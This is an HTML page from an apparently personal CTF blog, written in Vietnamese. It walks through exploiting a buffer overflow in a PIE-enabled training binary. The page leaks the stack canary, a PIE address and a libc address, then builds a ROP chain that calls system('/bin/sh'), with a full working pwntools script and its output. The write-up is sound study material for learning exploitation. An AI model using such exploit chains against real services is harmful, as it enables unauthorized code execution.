<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>training - leak Pie-Canary - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html">training - brute pie</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_with_read_challenge.html">training - leak with read</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_Pie_Canary_challenge.html" class="active">training - leak Pie-Canary</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item affix "><li class="part-title">RE_Pico</li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li><li class="chapter-item affix "><li class="part-title">RE_from_blabla</li><li class="chapter-item "><a href="../../../blogs/RE_from_blabla/problems.html">training</a></li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="training---leak-pie-canary"><a class="header" href="#training---leak-pie-canary">training - leak Pie-Canary</a></h1>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_PIE">binary file and exploit code</a></p>
<h3 id="file"><a class="header" href="#file">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ file passStore_PIE
passStore_PIE: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=269e6bec9af906e772b2b3f1e0b2f1ea8e9aeaac, for GNU/Linux 3.2.0, not stripped

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ checksec passStore_PIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

</code></pre>
<h3 id="source"><a class="header" href="#source">Source</a></h3>
<pre><code class="language-c">unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(&quot;Type the password: &quot;);
  read(0, buf, 0x300uLL);
  printf(&quot;You typed %s\n&quot;, buf);
  printf(&quot;Retype: &quot;);
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

</code></pre>
<h4 id="main-asm"><a class="header" href="#main-asm">main asm</a></h4>
<pre><code class="language-asm">pwndbg&gt; disass main
Dump of assembler code for function main:
   0x0000555555555258 &lt;+0&gt;:     endbr64
   0x000055555555525c &lt;+4&gt;:     push   rbp
   0x000055555555525d &lt;+5&gt;:     mov    rbp,rsp
   0x0000555555555260 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2db9]        # 0x555555558020 &lt;stdin@GLIBC_2.2.5&gt;
   0x0000555555555267 &lt;+15&gt;:    mov    esi,0x0
   0x000055555555526c &lt;+20&gt;:    mov    rdi,rax
   0x000055555555526f &lt;+23&gt;:    call   0x555555555090 &lt;setbuf@plt&gt;
   0x0000555555555274 &lt;+28&gt;:    mov    rax,QWORD PTR [rip+0x2d95]        # 0x555555558010 &lt;stdout@GLIBC_2.2.5&gt;
   0x000055555555527b &lt;+35&gt;:    mov    esi,0x0
   0x0000555555555280 &lt;+40&gt;:    mov    rdi,rax
   0x0000555555555283 &lt;+43&gt;:    call   0x555555555090 &lt;setbuf@plt&gt;
   0x0000555555555288 &lt;+48&gt;:    mov    eax,0x0
   0x000055555555528d &lt;+53&gt;:    call   0x5555555551b7 &lt;passStore&gt;
   0x0000555555555292 &lt;+58&gt;:    mov    eax,0x0
   0x0000555555555297 &lt;+63&gt;:    pop    rbp
   0x0000555555555298 &lt;+64&gt;:    ret
End of assembler dump.

</code></pre>
<p>Chall này chỉ khác chall trước mỗi cái Pie được bật. </p>
<p>Cũng tương tự như chall trước đó ở phần leak canary. Sau payload1 làm nhiệm vụ leak canary thì đến payload 2 ta sẽ điều khiển luồng thực thi để sao cho tiếp tục nhập được payload. Giờ thì phải xem xem <strong>passStore()</strong> sẽ ret về đâu:</p>
<pre><code class="language-shell">────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x555555555257 &lt;passStore+160&gt;                 ret
           &lt;0x555555555292; main+58&gt;
    ↓
   0x555555555292 &lt;main+58&gt;                       mov    eax, 0
   0x555555555297 &lt;main+63&gt;                       pop    rbp
   0x555555555298 &lt;main+64&gt;                       ret
    ↓
   0x7ffff7db6d90 &lt;__libc_start_call_main+128&gt;    mov    edi, eax
   0x7ffff7db6d92 &lt;__libc_start_call_main+130&gt;    call   exit
 &lt;exit&gt;

</code></pre>
<p>ta có thể thấy là ret về lệnh ngay sau lệnh call passStore() ở hàm main </p>
<pre><code class="language-python">   0x000055555555528d &lt;+53&gt;:    call   0x5555555551b7 &lt;passStore&gt;
   0x0000555555555292 &lt;+58&gt;:    mov    eax,0x0

</code></pre>
<p>và 2 lệnh này chỉ khác nhau mỗi 1 byte cuối cùng. Oke vậy ta sẽ có ý tưởng ghi đè byte cuối cùng để ret về. Phải làm thế mà không ghi đè cả addr 8 bytes là do <em><strong>Pie</strong></em> đang được bật, pie_base luôn đổi.</p>
<p>Ở chall NoPie trước đó mình giải thì mình call back main, trước đó thì có gadget ret, để tránh movaps trong kiến trúc 64bits. Tuy nhiên còn 1 cách tránh stack alignment nữa là. Thay vì call thẳng cái địa chỉ của func như call ngay <strong>main, hay các hàm như printf, read, system</strong>, thì ta có thể call <strong>main + x</strong> miễn sao thỏa mãn rsp và rbp đã được update lại:</p>
<pre><code class="language-shell">   0x0000555555555258 &lt;+0&gt;:     endbr64
   0x000055555555525c &lt;+4&gt;:     push   rbp
   0x000055555555525d &lt;+5&gt;:     mov    rbp,rsp
   0x0000555555555260 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2db9]

</code></pre>
<p>Ví dụ ở đây thay vì call back <strong>main</strong>, ta sẽ call <strong>main + 8</strong> thế là bypass việc phải có gadget ret đằng trước. Mình đã vướn ở đây rất lâu ==&quot;, và mình cũng đã update thêm cách này ở chall NoPie</p>
<p>Lý do mà phải tránh gadget ret đằng trước ở chall này mà chall trước lại k cần lăn tăn như vậy là vì, chall này Pie được bật mà hiện giờ thì vẫn chưa leak được pie_base, nên là các gadget toàn offset thoi ==&quot;. </p>
<p>À, còn 1 vấn đề nữa là ở payload này, mình phải dùng <strong>send(payload)</strong> thay vì sendline() là vì với sendline thì sẽ gửi thêm <strong>&quot;\n&quot;</strong> làm ghi đè mất byte kế cuối thành <strong>0x0a</strong>.</p>
<p>Sau khi pass được chỗ này thì mọi thứ trông dễ dàng hơn. giờ thì đến việc ta xem phải leak libc trước hay pie_base trước. Tại vì sau khi ta ghi đè trên stack thì nó vẫn ở đó, có nghĩa là payload ghi đè giá trị trên stack có chủ đích về sau <strong>buộc</strong> phải dài hơn payload trước đấy, chứ không thì chẳng thể leak được gì, do đều bị ghi đè cả rồi. </p>
<p>chall NoPie trước ở payload thứ 3 này, mình đã leak addr của setbuffer ở stack thứ 4, tuy nhiên giờ có 1 vấn đề sau khi không call lại <strong>main</strong> mà call <strong>main+53</strong> thì stack vẫn như cũ, tức là các stack bị ghi đè vẫn còn đó, nó đã ghi đè nốt chỗ stack mà ở chall trước mình leak setbuffer, nên giờ mình cần leak addr ở stack cao hơn.</p>
<p>Hơn nữa muốn leak pie_base thì cần phải leak được địa chỉ của các hàm như này:</p>
<pre><code class="language-python">0x0000555555555000  _init
0x0000555555555070  __cxa_finalize@plt
0x0000555555555080  __stack_chk_fail@plt
0x0000555555555090  setbuf@plt
0x00005555555550a0  printf@plt
0x00005555555550b0  read@plt
0x00005555555550c0  _start
0x00005555555550f0  deregister_tm_clones
0x0000555555555120  register_tm_clones
0x0000555555555160  __do_global_dtors_aux
0x00005555555551a0  frame_dummy
0x00005555555551b7  passStore
0x0000555555555258  main
0x000055555555529c  _fini

</code></pre>
<p>Stack sau khi send payload2 để quay lại <strong>main+53</strong></p>
<pre><code class="language-shell">pwndbg&gt; stack 50
00:0000│ rsi rsp 0x7fff14ebfa60 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
... ↓            6 skipped
07:0038│         0x7fff14ebfa98 ◂— 0x8dda103545364600
08:0040│ rbp     0x7fff14ebfaa0 ◂— 0x6161616161616161 ('aaaaaaaa')
09:0048│         0x7fff14ebfaa8 —▸ 0x55877522e292 (main+58) ◂— mov eax, 0
0a:0050│         0x7fff14ebfab0 ◂— 0x1
0b:0058│         0x7fff14ebfab8 —▸ 0x7f359a743d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│         0x7fff14ebfac0 ◂— 0x0
0d:0068│         0x7fff14ebfac8 —▸ 0x55877522e258 (main) ◂— endbr64
0e:0070│         0x7fff14ebfad0 ◂— 0x100000000
0f:0078│         0x7fff14ebfad8 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
10:0080│         0x7fff14ebfae0 ◂— 0x0
11:0088│         0x7fff14ebfae8 ◂— 0x8043fcf311f93ffc
12:0090│         0x7fff14ebfaf0 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
13:0098│         0x7fff14ebfaf8 —▸ 0x55877522e258 (main) ◂— endbr64
14:00a0│         0x7fff14ebfb00 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
15:00a8│         0x7fff14ebfb08 —▸ 0x7f359a985040 (_rtld_global) —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
16:00b0│         0x7fff14ebfb10 ◂— 0x7fbdd524e47b3ffc
17:00b8│         0x7fff14ebfb18 ◂— 0x7e28c81b6b733ffc
18:00c0│         0x7fff14ebfb20 ◂— 0x0
... ↓            4 skipped
1d:00e8│         0x7fff14ebfb48 ◂— 0x8dda103545364600
1e:00f0│         0x7fff14ebfb50 ◂— 0x0
1f:00f8│         0x7fff14ebfb58 —▸ 0x7f359a743e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
20:0100│         0x7fff14ebfb60 —▸ 0x7fff14ebfbd8 —▸ 0x7fff14ec1397 ◂— 'SHELL=/bin/bash'
21:0108│         0x7fff14ebfb68 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
22:0110│         0x7fff14ebfb70 —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
23:0118│         0x7fff14ebfb78 ◂— 0x0
24:0120│         0x7fff14ebfb80 ◂— 0x0

</code></pre>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fff14ebfac8 - 0x7fff14ebfa60
104
&gt;&gt;&gt; 0x7fff14ebfaa8 - 0x7fff14ebfa60
72
&gt;&gt;&gt; 0x7fff14ebfb58 - 0x7fff14ebfa60
248
</code></pre>
<p>Như đã thấy thì để leak libc cần tới <em><strong>248 bytes</strong></em>, nếu ghi đè hết <em><strong>248 bytes</strong></em> trước thì ghi đè nốt mấy cái khác, do đó ta sẽ libc leak sau khi leak và calc pie_base( mình cũng đã update thêm cách solve chall NoPie. Tương tự như chall này).</p>
<p>Thêm nữa thì stack <strong>0d:0068</strong> khá là đẹp với <strong>main</strong> tuy nhiên để đến đc đó cần tới <em><strong>104 bytes</strong></em>, mà chúng ta cần phải nhớ là payload2 để ret về <strong>main+53</strong> để tạo vòng lặp cho việc exploit thì chỉ có <em><strong>72 bytes</strong></em>. do đó để tránh lỗi thì ta sẽ chọn stack <strong>09:0048</strong>, tức là leak đc <strong>main+58</strong>, chỉ việc trừ <em><strong>58</strong></em> đi là có được main addr</p>
<p>Sau khi có được <em>main_addr</em> thì ta trừ đi <em>offset của main func</em> sẽ được pie_base, có pie_base thì sẽ tính được addr của các gadget  như <strong>ret, pop rdi</strong> cần thiết cho việc lấy shell.</p>
<p>Sau khi đã xong việc leak pie với payload3. Thì <strong>payload4 = payload2</strong> để 1 lần nữa call lại <strong>main+53</strong> tức là gọi <strong>passStore()</strong> </p>
<p>Tiếp tục leak libc với <em><strong>payload5 = 248 bytes</strong></em></p>
<p>payload6 sẽ giống chall trước đó, chỉ khác 1 chỗ là, ta cần tính addr của các gadget dựa vào pie_base. rồi lấy shell như trc.</p>
<h3 id="exploit-code"><a class="header" href="#exploit-code">exploit code</a></h3>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_PIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#Leak canary
payload1 = b&quot;a&quot;*56
r.sendlineafter(b&quot;Type the password: &quot;,payload1)
r.recvline()

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

#Call back main+53 &lt;=&gt; passStore()
payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p8(0x8d)
r.sendafter(b&quot;Retype: &quot;,payload2)

#leak main+58 to calc pie_base
payload3 = b&quot;a&quot;*72
r.sendafter(b&quot;Type the password:&quot;,payload3)

res = r.recvline().split(b&quot;a&quot;*72)[1] 
res = res.split(b&quot;\n&quot;)[0]
res += b&quot;\x00&quot;*(8 - len(res))

main_addr_pie = u64(res) - 0x3a #58
log.info(&quot;Main addr (pie) leak : &quot; + hex(main_addr_pie)) 
main_offset_pie = binary.symbols['main']
pie_base = main_addr_pie - main_offset_pie
log.info(&quot;Main offset pie : &quot; + hex(main_offset_pie)) 
log.info(&quot;Pie base addr : &quot; + hex(pie_base)) 

#call back main+53 &lt;=&gt; passStore()
payload4 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p8(0x8d)
r.sendafter(b&quot;Retype: &quot;,payload4)

#leak and calc libc
payload5 = b&quot;a&quot;*248
r.sendlineafter(b&quot;Type the password:&quot;,payload5)
r.recvline()

res = r.recv().split(b&quot;\nRetype&quot;)[0] 
res += b&quot;\x00&quot;*(8 - len(res))
leak = (u64(res) &lt;&lt; 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info(&quot;Libc base addr : &quot; + hex(libc_base)) 

system_offset = libc.symbols['system'] 
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_offset = rop.find_gadget(['ret'])[0] 

pop_rdi_ret_addr = pie_base + pop_rdi_ret_offset
ret_addr = pie_base + ret_offset
log.info(&quot;pop rdi ; ret addr : &quot; + hex(pop_rdi_ret_addr)) 
log.info(&quot;ret addr : &quot; + hex(ret_addr)) 

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info(&quot;system addr : &quot; + hex(system_addr)) 
log.info(&quot;/bin/sh addr : &quot; + hex(binsh_addr)) 

#get shell
junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload6 = junk + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload6)
r.interactive()

</code></pre>
<h3 id="result"><a class="header" href="#result">result</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_PIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE': pid 27696
[*] Leaked canary: 0xfb6bcbd3beea1c00
[*] Main addr (pie) leak : 0x560b4cfbb258
[*] Main offset pie : 0x1258
[*] Pie base addr : 0x560b4cfba000
[*] Libc base addr : 0x7f0b4bbce000
[*] pop rdi ; ret addr : 0x560b4cfbb1b2
[*] ret addr : 0x560b4cfbb01a
[*] system addr : 0x7f0b4bc1ed60
[*] /bin/sh addr : 0x7f0b4bda6698
[*] Switching to interactive mode
$ whoami
hjn4
$

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/training_leak_with_read_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/training_leak_with_read_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
